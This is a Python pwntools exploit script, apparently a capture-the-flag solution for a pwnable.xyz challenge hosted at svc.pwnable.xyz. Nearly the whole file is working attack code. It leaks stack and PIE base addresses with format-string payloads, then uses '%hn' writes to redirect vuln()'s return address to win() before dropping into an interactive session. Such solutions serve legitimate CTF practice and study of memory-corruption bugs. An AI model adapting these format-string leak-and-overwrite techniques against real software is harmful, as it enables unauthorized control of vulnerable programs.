from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/challenge')
else:
    r = remote('svc.pwnable.xyz', 30010)

sla = r.sendlineafter
sa = r.sendafter

def edit_name(name):
    sla('> ', '1')
    sa('Name: ', name)

def prep_msg():
    sla('> ', '2')

def print_msg():
    sla('> ', '3')

cmd_offset = 0x2040  # offset of cmd from PIE base
win_offset = 0x9fd  # offset of win() from PIE base


# stack leak

sa('Name: ', 'a' * 0x19 + '%10$p')

prep_msg()

r.recvuntil('0x')
ebp = int(r.recvn(8), 16) - 0x10  # ebp of vuln()
log.info('ebp of vuln(): ' + hex(ebp))
ret = ebp + 4  # return address of vuln()


# PIE leak

edit_name('a' * 0x19 + '%9$p')

prep_msg()

r.recvuntil('0x')
pie = int(r.recvn(8), 16) - 0x1fa0  # PIE base
log.info('PIE base: ' + hex(pie))
cmd = pie + cmd_offset
win = pie + win_offset


# extend format string

edit_name('a' * 0x19 + 'a%6$hn')

sla('> ', str((cmd & 0xffffff00) + 2))

for offset in range(0x26, 0x30):
    sla('> ', str(cmd + offset))


# call win()

sla('> ', str((ret & 0xffffff00) + 1 - 0x100000000))
sa('Name: ', '%' + str((win & 0xffff) - 11) + 'c%6$hn\x00')

sla('> ', str(ret - 0x100000000))

sla('> ', '0')  # return vuln()


r.interactive()